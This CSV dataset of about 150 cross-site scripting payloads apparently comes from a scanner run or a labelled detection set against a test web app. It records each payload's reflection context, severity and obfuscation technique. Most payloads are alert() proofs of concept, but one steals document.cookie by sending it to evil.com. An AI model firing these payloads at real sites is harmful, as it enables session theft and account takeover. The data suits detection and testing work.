payload,payload_with_context,context,severity,source,sink,reflection_position,technique
%3Cimg%20src=xx%20onerror=alert(1)%3E,"%3Cimg%20src=xx%20onerror=alert(1)%3E [position:attribute snippet_context:...ail: <input id=""reader-email"" name=""email"" value=""""> <br><br> <a href=""%3Cimg%20src=xx%20onerror=]",tag_injection,medium,,,attribute,url_encoding
"eval(""alert(1)"")","eval(""alert(1)"") [position:attribute]",js_uri,high,,,attribute,original
"</SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>","</SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT> [position:attribute snippet_context:...nk:</strong> <code>name</code> injected inside JS string: <code>var username = '</SCRIPT>"">'><SCR]",tag_injection,high,,,attribute,encoding|case_variation
innerHTML=location.hash>#<script>alert(1)</script>,"innerHTML=location.hash>#<script>alert(1)</script> [position:comment snippet_context:...style=""color:var(--text-muted);font-size:.875rem"">← DOM XSS</a> <!-- param:name=innerHTML=locatio]",tag_injection,high,,,comment,none
<BODY ONLOAD=alert(‘XSS’)>,"<BODY ONLOAD=alert(‘XSS’)> [position:html_body snippet_context:...t-primary);padding:.65rem .9rem;border-radius:6px;font-family:Inter,sans-serif""><BODY ONLOAD=aler]",tag_injection,medium,,,html_body,case_variation
<svg/onload=alert(1)>,<svg/onload=alert(1)> [position:script],tag_injection,low,,,script,obfuscated:comment_inject
<script>prompt(1)</script>,<script>prompt(1)</script> [position:html_body],script_injection,medium,,,html_body,original
onerror=alert(0);>,"onerror=alert(0);> [position:html_body snippet_context:...gin-bottom:.75rem"">Bio</div> <div style=""font-size:.925rem;line-height:1.7"">onerror=alert(0);></d]",tag_injection,medium,,,html_body,none
<svg on\u006co\u0061d=\u0061\u006cert(1)>,<svg on\u006co\u0061d=\u0061\u006cert(1)> [position:attribute],event_handler,medium,,,attribute,obfuscated:unicode_escape
prompt(location.hash),"prompt(location.hash) [position:attribute snippet_context:...ail: <input id=""reader-email"" name=""email"" value=""""> <br><br> <a href=""prompt(location.hash)"">Nex]",tag_injection,medium,,,attribute,none
<svg><a onload=alert(1)></a>,<svg><a onload=alert(1)></a> [position:attribute snippet_context:...round:var(--bg-0);color:var(--text-primary);padding:2rem} .box{border:2px solid <svg><a onload=al],tag_injection,medium,,,attribute,none
""" onfocus=alert(1) autofocus=""",""" onfocus=alert(1) autofocus="" [position:attribute]",attribute_escape,high,,,attribute,obfuscated:comment_inject
"onbeforeinput=""alert(1)""","onbeforeinput=""alert(1)"" [position:html_body]",tag_injection,medium,,,html_body,mutated
<img/’onerror=alert(1) src=a>,<img/’onerror=alert(1) src=a> [position:attribute snippet_context:...round:var(--bg-0);color:var(--text-primary);padding:2rem} .box{border:2px solid <img/’onerror=ale],tag_injection,medium,,,attribute,none
onerror=”alert(‘AnonKryptiQuz’),"onerror=”alert(‘AnonKryptiQuz’) [position:html_body snippet_context:onerror=”alert(‘AnonKryptiQuz’)({""status"": ""ok"", ""message"": ""Nexora API response""});]",tag_injection,medium,,,html_body,none
"%20""><svg onload=alert(1)>","%20""><svg onload=alert(1)> [position:attribute snippet_context:...round:var(--bg-0);color:var(--text-primary);padding:2rem} .box{border:2px solid %20""><svg onload=]",tag_injection,medium,,,attribute,url_encoding
"<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>","<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT> [position:attribute snippet_context:...ong>Sink:</strong> <code>lang</code> inside JS string: <code>var currentLang = ""<SCRIPT>String.fr]",tag_injection,high,,,attribute,encoding|case_variation
setInterval('ale'+'rt(10)');,setInterval('ale'+'rt(10)'); [position:script snippet_context:...nk:</strong> <code>name</code> injected inside JS string: <code>var username = 'setInterval('ale'],tag_injection,high,,,script,none
<video src=x onerror=alert(1)>,<video src=x onerror=alert(1)> [position:style],event_handler,high,,,style,original
<script>alert(1)</script>,<script>alert(1)</script> [position:html_body snippet_context:<html><script>alert(1)</script></html>],tag_injection,medium,,,html_body,original
<SCRIPT>alert(1)</SCRIPT>,<SCRIPT>alert(1)</SCRIPT> [position:script],script_injection,low,,,script,mutated
<BODY ONLOAD=alert(‘XSS’)>,<BODY ONLOAD=alert(‘XSS’)> [position:attribute snippet_context:...round:var(--bg-0);color:var(--text-primary);padding:2rem} .box{border:2px solid <BODY ONLOAD=aler],tag_injection,medium,,,attribute,case_variation
<svg////////onload=alert(1)>,"<svg////////onload=alert(1)> [position:attribute snippet_context:...;border:1px solid var(--border);border-radius:6px;padding:1rem;margin:.75rem 0""><svg////////onloa]",tag_injection,medium,,,attribute,none
<BODY ONLOAD=alert(8839)>,"<BODY ONLOAD=alert(8839)> [position:attribute snippet_context:...-radius:6px;cursor:pointer;margin-left:.5rem"">Load</button></form> <iframe src=""<BODY ONLOAD=aler]",tag_injection,medium,,,attribute,case_variation
innerHTML=location.hash>#<script>alert(1)</script>,"innerHTML=location.hash>#<script>alert(1)</script> [position:attribute snippet_context:...ref=""/static/style.css""> <style>body{background:var(--bg-0)} .themed{background:innerHTML=locatio]",tag_injection,high,,,attribute,none
"""><svg onload=alert()>","""><svg onload=alert()> [position:script snippet_context:...nk:</strong> <code>name</code> injected inside JS string: <code>var username = '""><svg onload=ale]",tag_injection,medium,,,script,none
""" onload=alert(1) x=""",""" onload=alert(1) x="" [position:html_body]",script_injection,high,,,html_body,obfuscated:comment_inject
<body onunhandledrejection=alert(1)><script>fetch('//xyz')</script>,"<body onunhandledrejection=alert(1)><script>fetch('//xyz')</script> [position:attribute snippet_context:...ng>Sink:</strong> <code>val</code> inside onclick handler: <code>onclick=""calc('<body onunhandled]",tag_injection,high,,,attribute,none
嘼img src=1 onerror=alert(1)嘾,"嘼img src=1 onerror=alert(1)嘾 [position:attribute snippet_context:...ref=""/static/style.css""> <style>body{background:var(--bg-0)} .themed{background:嘼img src=1 onerro]",tag_injection,medium,,,attribute,none
"window[""ev"".concat(""al"")](String.fromCharCode(97,108,101,114,116,40,49,41));","window[""ev"".concat(""al"")](String.fromCharCode(97,108,101,114,116,40,49,41)); [position:attribute snippet_context:...ng>Sink:</strong> <code>val</code> inside onclick handler: <code>onclick=""calc('window[""ev"".conca]",tag_injection,high,,,attribute,encoding
"onerror=""alert('AnonKryptiQuz')""","onerror=""alert('AnonKryptiQuz')"" [position:script snippet_context:...nk:</strong> <code>name</code> injected inside JS string: <code>var username = 'onerror=""alert('A]",tag_injection,medium,,,script,none
"onload=""alert(1)""","onload=""alert(1)"" [position:html_body]",tag_injection,medium,,,html_body,none
<script ^__^>alert(String.fromCharCode(49))</script ^__^,"<script ^__^>alert(String.fromCharCode(49))</script ^__^ [position:attribute snippet_context:....82rem;color:var(--text-muted);margin-bottom:1rem"">Showing results for: <strong><script ^__^>aler]",attribute_escape,high,,,attribute,encoding
"</SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>","</SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT> [position:attribute snippet_context:....82rem;color:var(--text-muted);margin-bottom:1rem"">Showing results for: <strong></SCRIPT>"">'><SCR]",tag_injection,high,,,attribute,encoding|case_variation
"<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>","<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT> [position:attribute snippet_context:...-radius:6px;cursor:pointer;margin-left:.5rem"">Load</button></form> <iframe src=""<SCRIPT>String.fr]",tag_injection,high,,,attribute,encoding|case_variation
' onload=alert(1) x=',' onload=alert(1) x=' [position:attribute],attribute_escape,high,,,attribute,mutated
<script>alert(document.domain)</script>,<script>alert(document.domain)</script> [position:script],js_uri,high,,,script,original
\u003e\u003cimg src=1 onerror=confirm`1`\u003e,\u003e\u003cimg src=1 onerror=confirm`1`\u003e [position:attribute],attribute_escape,medium,,,attribute,mutated
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));","//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83)); [position:html_body snippet_context:...iv class=""post-meta""><span class=""post-author"">testuser</span></div> <div>//--></SCRIPT><SCRIPT>a]",tag_injection,high,,,html_body,encoding|case_variation
.alert(1);,".alert(1); [position:attribute snippet_context:...=""avatar"">.</div> <div> <div style=""font-weight:600;font-size:1.1rem"">.alert(1);</div> <div style]",tag_injection,medium,,,attribute,none
;alert(1);,";alert(1); [position:script snippet_context:...ong>Sink:</strong> <code>lang</code> inside JS string: <code>var currentLang = "";alert(1);""</code]",tag_injection,medium,,,script,none
"></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>","></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT> [position:attribute snippet_context:...nk:</strong> <code>name</code> injected inside JS string: <code>var username = '></SCRIPT>"">'><SC]",tag_injection,high,,,attribute,encoding|case_variation
' onmouseover=alert(1) ',' onmouseover=alert(1) ' [position:attribute],attribute_escape,low,,,attribute,obfuscated:html_entity
"//"";alert(String.fromCharCode(88,83,83))","//"";alert(String.fromCharCode(88,83,83)) [position:attribute snippet_context:...ary);margin:.75rem 0"">Click below to continue to your destination.</p> <a href=""//"";alert(String.]",tag_injection,high,,,attribute,encoding
"lOcAtIoN=""jAvAsCrIpT:AlErT(1)""","lOcAtIoN=""jAvAsCrIpT:AlErT(1)"" [position:script]",tag_injection,medium,,,script,obfuscated:mixed_case
${confirm(1)},${confirm(1)} [position:none],js_uri,high,,,none,mutated
innerHTML=location.hash>#<marquee>alert(1)</script>,"innerHTML=location.hash>#<marquee>alert(1)</script> [position:html_body snippet_context:...iv class=""post-meta""><span class=""post-author"">testuser</span></div> <div>innerHTML=location.hash]",tag_injection,high,,,html_body,mutated
"window[""ev"".concat(""al"")](String.fromCharCode(97,108,101,114,116,40,49,41));","window[""ev"".concat(""al"")](String.fromCharCode(97,108,101,114,116,40,49,41)); [position:script snippet_context:...HTML and inside a JS object literal.</p> <h2>Multi-Param Reflection</h2> <p>a = window[""ev"".conca]",tag_injection,high,,,script,encoding
<img src=x onerror=alert(1)>,<img src=x onerror=alert(1)> [position:html_body],tag_injection,high,,,html_body,obfuscated:comment_inject
<svg onload=alert()>,<svg onload=alert()> [position:html_body],tag_injection,medium,,,html_body,none
javaSCRIPT:alert(document.domain),javaSCRIPT:alert(document.domain) [position:script],js_uri,low,,,script,mutated
alert(1),alert(1) [position:attribute snippet_context:...round:var(--bg-0);color:var(--text-primary);padding:2rem} .box{border:2px solid alert(1);padding:],tag_injection,medium,,,attribute,none
"< script>d.innerHTML+='';</script>//[""'`-->]]>]</div>","< script>d.innerHTML+='';</script>//[""'`-->]]>]</div> [position:html_body snippet_context:...nk:</strong> <code>name</code> injected inside JS string: <code>var username = '< script>d.innerH]",script_injection,high,,,html_body,mutated
{{constructor.constructor(‘a=document;window.alert(1)’)()}},"{{constructor.constructor(‘a=document;window.alert(1)’)()}} [position:attribute snippet_context:.../level4.png"" /> <br> <img src=""/static/loading.gif"" onload=""startTimer('{{constructor.constructor]",js_uri,medium,,,attribute,mutated
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));","//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83)); [position:attribute snippet_context:<!DOCTYPE html><html><head> <meta http-equiv=""refresh"" content=""5;url=//--></SCRIPT><SCRIPT>alert(St]",tag_injection,high,,,attribute,encoding|case_variation
"""><script alert(String.fromCharCode(88,83,83))</script>","""><script alert(String.fromCharCode(88,83,83))</script> [position:html_body snippet_context:...gin-bottom:.75rem"">Bio</div> <div style=""font-size:.925rem;line-height:1.7"">""><script alert(Strin]",tag_injection,high,,,html_body,encoding
"<object data=""javascript:alert(1)"">","<object data=""javascript:alert(1)""> [position:html_body]",attribute_escape,high,,,html_body,mutated
"<svg onload=""confirm(7)"">","<svg onload=""confirm(7)""> [position:attribute snippet_context:<!DOCTYPE html><html><head> <meta http-equiv=""refresh"" content=""5;url=<svg onload=""confirm(7)"">""> <l]",tag_injection,medium,,,attribute,none
"javascript:void(document.location=""http://evil.com"")","javascript:void(document.location=""http://evil.com"") [position:script]",event_handler,high,,,script,original
""" onerror=alert(1) x=""",""" onerror=alert(1) x="" [position:attribute]",attribute_escape,low,,,attribute,original
< svgonload=alert(1)>,"< svgonload=alert(1)> [position:html_body snippet_context:...title=""Delete this comment"">✕</button> </form> </div> <div>< svg onload = alert(1) ></div> </div>]",tag_injection,medium,,,html_body,mutated
"' onerror
=alert(	1) x
='","' onerror
=alert(	1) x
=' [position:attribute]",attribute_escape,medium,,,attribute,obfuscated:tab_newline_inject
""" onload=alert(1) x=""",""" onload=alert(1) x="" [position:attribute]",attribute_escape,medium,,,attribute,original
"""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>","""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));> [position:attribute snippet_context:...ng>Sink:</strong> <code>val</code> inside onclick handler: <code>onclick=""calc('""><img src=x oner]",tag_injection,high,,,attribute,encoding
"eval(""alert(1)"")","eval(""alert(1)"") [position:none]",dom_sink,high,,,none,original
javascript:confirm(1),javascript:confirm(1) [position:attribute],js_uri,medium,,,attribute,obfuscated:url_encode
prompt(9),"prompt(9) [position:html_body snippet_context:prompt(9)({""status"": ""ok"", ""message"": ""Nexora API response""});]",tag_injection,medium,,,html_body,none
"mrco24""type=image src onerror=""alert(1)""","mrco24""type=image src onerror=""alert(1)"" [position:attribute snippet_context:<!DOCTYPE html><html><head> <meta http-equiv=""refresh"" content=""5;url=mrco24""type=image src onerror=]",tag_injection,medium,,,attribute,none
"\"" onerror=alert(1)//","\"" onerror=alert(1)// [position:none]",event_handler,high,,,none,obfuscated:html_entity
"<embed src=""javaSCRIPT:alert(1)"">","<embed src=""javaSCRIPT:alert(1)""> [position:script]",script_injection,medium,,,script,mutated
<svg/on\u006co\u0061d=\u0061\u006cert(1)>,<svg/on\u006co\u0061d=\u0061\u006cert(1)> [position:script],tag_injection,low,,,script,obfuscated:unicode_escape
""" onerror=alert(1) x=""",""" onerror=alert(1) x="" [position:attribute]",attribute_escape,medium,,,attribute,mutated
"\"" onerror=alert(1)//","\"" onerror=alert(1)// [position:attribute]",attribute_escape,high,,,attribute,original
alert(String.fromCharCode(88))</SCRIPT>,"alert(String.fromCharCode(88))</SCRIPT> [position:html_body snippet_context:...t-primary);padding:.65rem .9rem;border-radius:6px;font-family:Inter,sans-serif"">alert(String.from]",tag_injection,high,,,html_body,encoding
"window[""ev"".concat(""al"")](String.fromCharCode(97,108,101,114,116,40,49,41));","window[""ev"".concat(""al"")](String.fromCharCode(97,108,101,114,116,40,49,41)); [position:html_body snippet_context:...gin-bottom:.75rem"">Bio</div> <div style=""font-size:.925rem;line-height:1.7"">window[""ev"".concat(""a]",tag_injection,high,,,html_body,encoding
<svg/onload=alert(1)>,<svg/onload=alert(1)> [position:html_body],tag_injection,low,,,html_body,mutated
</tag><svg onload=alert(1)>,"</tag><svg onload=alert(1)> [position:attribute snippet_context:..."">Nexora Member</span></div> </div> </div> <div class=""card"" data-user=""</tag><svg onload=alert(1]",attribute_escape,medium,,,attribute,none
\' onload=alert(1)//,\' onload=alert(1)// [position:attribute],attribute_escape,high,,,attribute,mutated
""" onfocus=alert(1) autofocus=""",""" onfocus=alert(1) autofocus="" [position:attribute]",attribute_escape,medium,,,attribute,mutated
"""><script alert(String.fromCharCode(88,83,83))</script>","""><script alert(String.fromCharCode(88,83,83))</script> [position:attribute snippet_context:...round:var(--bg-0);color:var(--text-primary);padding:2rem} .box{border:2px solid ""><script alert(S]",tag_injection,high,,,attribute,encoding
onload='self.alert(1)',onload='self.alert(1)' [position:html_body],tag_injection,medium,,,html_body,mutated
\' onerror=alert(1)//,\' onerror=alert(1)// [position:html_body],attribute_escape,medium,,,html_body,mutated
onload&#61;'alert(1)',onload&#61;'alert(1)' [position:html_body],tag_injection,medium,,,html_body,mutated
"OnLOaD=""AlERt(1)""","OnLOaD=""AlERt(1)"" [position:html_body snippet_context:...rm> </div> <div style=""font-size:.9rem;color:var(--text-secondary)"">OnLOaD=""AlERt(1)""</div> </div]",tag_injection,medium,,,html_body,mutated
6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/,6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/ [position:attribute snippet_context:...g> <code>color</code> param in unquoted attribute: <code>style=background-color:6'%22()%26%25%22%],tag_injection,medium,,,attribute,url_encoding
onload='alert(1)',"onload='alert(1)' [position:attribute snippet_context:...ref=""/static/style.css""> <style>body{background:var(--bg-0)} .themed{background:onload='alert(1)']",tag_injection,medium,,,attribute,none
<script>confirm(1)</script>,<script>confirm(1)</script> [position:script],tag_injection,medium,,,script,mutated
<BODY ONLOAD=alert(8839)>,"<BODY ONLOAD=alert(8839)> [position:html_body snippet_context:..."">Untitled</div> <div style=""font-size:.9rem;color:var(--text-secondary)""><BODY ONLOAD=alert(8839]",tag_injection,medium,,,html_body,case_variation
"<object data=""javascript:alert(1)"">","<object data=""javascript:alert(1)""> [position:html_body]",tag_injection,medium,,,html_body,original
onerror=alert;throw 23;,"onerror=alert;throw 23; [position:attribute snippet_context:...ary);margin:.75rem 0"">Click below to continue to your destination.</p> <a href=""onerror=alert;thr]",tag_injection,low,,,attribute,none
"setTimeout(""alert(1)"",0)","setTimeout(""alert(1)"",0) [position:none]",event_handler,low,,,none,obfuscated:comment_inject
"setTimeout(""alert(1)"",0)","setTimeout(""alert(1)"",0) [position:script]",dom_sink,high,,,script,mutated
"<details open ontoggle
=alert(	1)>","<details open ontoggle
=alert(	1)> [position:script]",event_handler,medium,,,script,obfuscated:tab_newline_inject
\x3cscript\x3eprompt(1)\x3c/script\x3e,\x3cscript\x3eprompt(1)\x3c/script\x3e [position:script],script_injection,low,,,script,obfuscated:hex_escape
"location=""javascript:al'+'ert(1)""","location=""javascript:al'+'ert(1)"" [position:script]",dom_sink,high,,,script,obfuscated:concat_split
j\u0061v\u0061script:confirm(1),j\u0061v\u0061script:confirm(1) [position:attribute],js_uri,high,,,attribute,obfuscated:unicode_escape
<img src=x onerror=alert(1)>,<img src=x onerror=alert(1)> [position:html_body],tag_injection,medium,,,html_body,original
<img/’onerror=alert(1) src=a>,"<img/’onerror=alert(1) src=a> [position:html_body snippet_context:<img/’onerror=alert(1) src=a>({""status"": ""ok"", ""message"": ""Nexora API response""});]",tag_injection,medium,,,html_body,none
#{alert(1)},#{alert(1)} [position:attribute],attribute_escape,low,,,attribute,obfuscated:html_entity
"document.write(""<img src=x onerror=alert(1)>"")","document.write(""<img src=x onerror=alert(1)>"") [position:script]",dom_sink,high,,,script,original
""" onload=alert(1) x=""",""" onload=alert(1) x="" [position:script]",script_injection,high,,,script,original
javascript:alert(1),javascript:alert(1) [position:attribute],js_uri,low,,,attribute,original
"""><svg onload=alert(1)>","""><svg onload=alert(1)> [position:dom]",tag_injection,medium,,,dom,none
<body onload=alert(1)>,<body onload=alert(1)> [position:attribute],event_handler,high,,,attribute,original
confirm(),"confirm() [position:attribute snippet_context:...=""avatar"">C</div> <div> <div style=""font-weight:600;font-size:1.1rem"">confirm()</div> <div style=]",tag_injection,medium,,,attribute,none
"\"" onerror=alert(1)//","\"" onerror=alert(1)// [position:html_body]",attribute_escape,low,,,html_body,original
<svg/onload=alert(1)>,<svg/onload=alert(1)> [position:none],event_handler,low,,,none,original
"eval(""alert(1)"")","eval(""alert(1)"") [position:none]",dom_sink,high,,,none,original
"SRC=javascript&#058;alert(String&#46;fromCharCode(88,83,83))&gt;","SRC=javascript&#058;alert(String&#46;fromCharCode(88,83,83))&gt; [position:html_body snippet_context:...rm> </div> <div style=""font-size:.9rem;color:var(--text-secondary)"">SRC=javascript&#058;alert(Str]",tag_injection,high,,,html_body,html_entity|encoding
"eval(""alert(1)"")","eval(""alert(1)"") [position:attribute]",attribute_escape,low,,,attribute,original
"<SCRIPT>document.location=""http://evil.com/?c=""+document.cookie</SCRIPT>","<SCRIPT>document.location=""http://evil.com/?c=""+document.cookie</SCRIPT> [position:script]",script_injection,high,,,script,mutated
"<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>","<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT> [position:attribute snippet_context:...;border:1px solid var(--border);border-radius:6px;padding:1rem;margin:.75rem 0""><SCRIPT>String.fr]",tag_injection,high,,,attribute,encoding|case_variation
"<script>alert(String.fromCharCode(88,83,83))</script>","<script>alert(String.fromCharCode(88,83,83))</script> [position:attribute snippet_context:...-radius:6px;cursor:pointer;margin-left:.5rem"">Load</button></form> <iframe src=""<script>alert(Str]",tag_injection,high,,,attribute,encoding
[].sort.call`${alert}23`,"[].sort.call`${alert}23` [position:attribute snippet_context:.../level4.png"" /> <br> <img src=""/static/loading.gif"" onload=""startTimer('[].sort.call`${alert}23`']",js_uri,low,,,attribute,none
"{{constructor.constructor('eval(atob(""YWxlcnQoMSk=""))')()}}","{{constructor.constructor('eval(atob(""YWxlcnQoMSk=""))')()}} [position:script snippet_context:...nk:</strong> <code>name</code> injected inside JS string: <code>var username = '{{constructor.con]",script_injection,high,,,script,encoding
<img src/onerror=prompt(8)>,"<img src/onerror=prompt(8)> [position:attribute snippet_context:...ref=""/static/style.css""> <style>body{background:var(--bg-0)} .themed{background:<img src/onerror=]",tag_injection,medium,,,attribute,none
"data:text/html,<scr/**/ipt>alert(1)</scr/**/ipt>","data:text/html,<scr/**/ipt>alert(1)</scr/**/ipt> [position:none]",js_uri,high,,,none,obfuscated:comment_inject
""" onload
=alert(	1) x
=""",""" onload
=alert(	1) x
="" [position:attribute]",attribute_escape,high,,,attribute,obfuscated:tab_newline_inject
嘼img src=1 onerror=alert(1)嘾,"嘼img src=1 onerror=alert(1)嘾 [position:html_body snippet_context:...<div class=""post-meta""><span class=""post-author"">Guest</span></div> <div>嘼img src=1 onerror=alert]",tag_injection,medium,,,html_body,none
${alert(1)},${alert(1)} [position:attribute],template_injection,low,,,attribute,original
onload='confirm`1`',onload='confirm`1`' [position:html_body],attribute_escape,medium,,,html_body,mutated
<%= alert(1) %>,<%= alert(1) %> [position:attribute],template_injection,medium,,,attribute,original
' onmouseover=alert(1) ',' onmouseover=alert(1) ' [position:attribute],attribute_escape,high,,,attribute,original
"location=""javascript:alert(1)""","location=""javascript:alert(1)"" [position:attribute]",event_handler,medium,,,attribute,original
<svgonload=alert(1)>,"<svgonload=alert(1)> [position:attribute snippet_context:...iv> <div style=""margin-top:.75rem;font-size:.875rem""> 🔗 <a href=""<svg onload = alert(1) >"" style=]",tag_injection,medium,,,attribute,none
<video src=x onload=alert(1)>,<video src=x onload=alert(1)> [position:html_body],event_handler,medium,,,html_body,mutated
\' onerror=alert(1)//,\' onerror=alert(1)// [position:script],attribute_escape,low,,,script,original
<svg/onload=confirm(1)>,<svg/onload=confirm(1)> [position:script],tag_injection,medium,,,script,mutated
&quot; onerror=confirm(1) x=&quot;,&quot; onerror=confirm(1) x=&quot; [position:html_body],attribute_escape,medium,,,html_body,mutated
<script>confirm(document.domain)</script>,<script>confirm(document.domain)</script> [position:script],template_injection,medium,,,script,mutated
\' onerror=alert(1)//,\' onerror=alert(1)// [position:script],attribute_escape,medium,,,script,original
"<video>d.innerHTML+='';</script>//[""'`-->]]>]</div>","<video>d.innerHTML+='';</script>//[""'`-->]]>]</div> [position:html_body snippet_context:...st-meta""><span class=""post-author"">Anonymous</span> · just now</div> <div><video>d.innerHTML+='';]",tag_injection,high,,,html_body,mutated
onload=”self.alert(1),"onload=”self.alert(1) [position:attribute snippet_context:<!DOCTYPE html><html><head> <meta http-equiv=""refresh"" content=""5;url=onload=”self.alert(1)""> <link ]",tag_injection,medium,,,attribute,mutated
"""><marquee alert(String.fromCharCode(88,83,83))</script>","""><marquee alert(String.fromCharCode(88,83,83))</script> [position:attribute snippet_context:...bject literal.</p> <h2>Multi-Param Reflection</h2> <p>a = </p><p>b = </p><p>c = ""><marquee alert(]",tag_injection,high,,,attribute,mutated
%3cimg onerror=alert(1) src=a%3e,"%3cimg onerror=alert(1) src=a%3e [position:html_body snippet_context:...t-primary);padding:.65rem .9rem;border-radius:6px;font-family:Inter,sans-serif"">%3cimg onerror=al]",tag_injection,medium,,,html_body,url_encoding
onerror='alert(1)',onerror='alert(1)' [position:html_body],tag_injection,medium,,,html_body,none
\' onerror=alert(1)//,\' onerror=alert(1)// [position:none],attribute_escape,low,,,none,obfuscated:hex_escape
onerror='alert(1)',"onerror='alert(1)' [position:attribute snippet_context:...;border:1px solid var(--border);border-radius:6px;padding:1rem;margin:.75rem 0"">onerror='alert(1)]",tag_injection,medium,,,attribute,none
"""><script alert(String.fromCharCode(88,83,83))</script>","""><script alert(String.fromCharCode(88,83,83))</script> [position:html_body snippet_context:...nk:</strong> <code>name</code> injected inside JS string: <code>var username = '""><script alert(S]",tag_injection,high,,,html_body,encoding
"alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--","alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//-- [position:attribute snippet_context:...ary);margin:.75rem 0"">Click below to continue to your destination.</p> <a href=""alert(String.from]",tag_injection,high,,,attribute,encoding
"\""><img src=x onerror=alert(1)>","\""><img src=x onerror=alert(1)> [position:script]",attribute_escape,high,,,script,mutated
"oneRrOr=""AleRt(1)""","oneRrOr=""AleRt(1)"" [position:html_body]",tag_injection,medium,,,html_body,mutated
嘼img src=1 onerror=alert(1)嘾,嘼img src=1 onerror=alert(1)嘾 [position:attribute snippet_context:...g> <code>color</code> param in unquoted attribute: <code>style=background-color:嘼img src=1 onerro],attribute_escape,medium,,,attribute,none
javascript:alert(1),"javascript:alert(1) [position:attribute snippet_context:...iv> <div style=""margin-top:.75rem;font-size:.875rem""> 🔗 <a href=""javascript:alert(1)"" style=""colo]",js_uri,medium,,,attribute,none
onerror='alert(1)',"onerror='alert(1)' [position:html_body snippet_context:...t-primary);padding:.65rem .9rem;border-radius:6px;font-family:Inter,sans-serif"">onerror='alert(1)]",tag_injection,medium,,,html_body,none
"<iframe src=""javaSCRIPT:alert(1)"">","<iframe src=""javaSCRIPT:alert(1)""> [position:html_body]",script_injection,low,,,html_body,mutated
<details open ontoggle=alert(1)>,<details open ontoggle=alert(1)> [position:attribute],event_handler,low,,,attribute,original
"data:text/html,<script>alert(1)</script>","data:text/html,<script>alert(1)</script> [position:attribute]",js_uri,medium,,,attribute,original
prompt(9),prompt(9) [position:attribute snippet_context:...g> <code>color</code> param in unquoted attribute: <code>style=background-color:prompt(9)</code><],tag_injection,medium,,,attribute,none
<marquee onstart=alert(1)>,<marquee onstart=alert(1)> [position:script],tag_injection,medium,,,script,original
.alert(1);,.alert(1); [position:script snippet_context:...nk:</strong> <code>name</code> injected inside JS string: <code>var username = '.alert(1);'</code],tag_injection,medium,,,script,none
-alert(1)-',"-alert(1)-' [position:attribute snippet_context:...ng>Sink:</strong> <code>val</code> inside onclick handler: <code>onclick=""calc('-alert(1)-'')""</c]",tag_injection,medium,,,attribute,none
<img src=x onerror=alert(1)>,<img src=x onerror=alert(1)> [position:html_body],tag_injection,high,,,html_body,original
"?alert(1)"",","?alert(1)"", [position:attribute snippet_context:<!DOCTYPE html><html><head> <meta http-equiv=""refresh"" content=""5;url=?alert(1)"",""> <link rel=""style]",tag_injection,medium,,,attribute,none
